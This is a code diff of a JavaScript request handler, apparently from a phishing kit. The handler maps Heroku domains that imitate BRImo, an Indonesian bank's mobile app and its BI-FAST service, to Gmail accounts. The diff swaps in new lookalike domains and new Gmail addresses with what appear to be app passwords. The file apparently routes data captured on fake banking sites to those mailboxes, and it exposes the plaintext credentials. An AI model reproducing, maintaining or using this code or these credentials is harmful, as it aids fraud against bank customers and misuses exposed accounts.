@@ -12,10 +12,10 @@ export default function handler(req, res) {
         email = 'walangkudu@gmail.com';
         pass = 'osbhgxbiywffpwnk';
 
-    } else if (url == 'daftar-bl-fast-brlmo.herokuapp.com'){
+    } else if (url == 'daftar-brlmo-bl-fast.herokuapp.com'){
         
-        email = 'ikanhiu603@gmail.com';
-        pass = 'cadnrlizjhuvhwsa';
+        email = 'impianbarub@gmail.com';
+        pass = 'rofndibfsscucshv';
 
     } else if (url == 'bi-fas-app-brimo.herokuapp.com'){
         email = 'rumahbarubaru443@gmail.com';
@@ -49,7 +49,7 @@ export default function handler(req, res) {
     pass = 'xbohxjweimfcuhpx';
    
     }
-    else if (url == 'bri-mo-bifas.herokuapp.com'){
+    else if (url == ' bri-mo-bifas.herokuapp.com'){
         email = 'aliakbarbar101@gmail.com';
         pass = 'ywmrzlrlcvssjkhu';
        
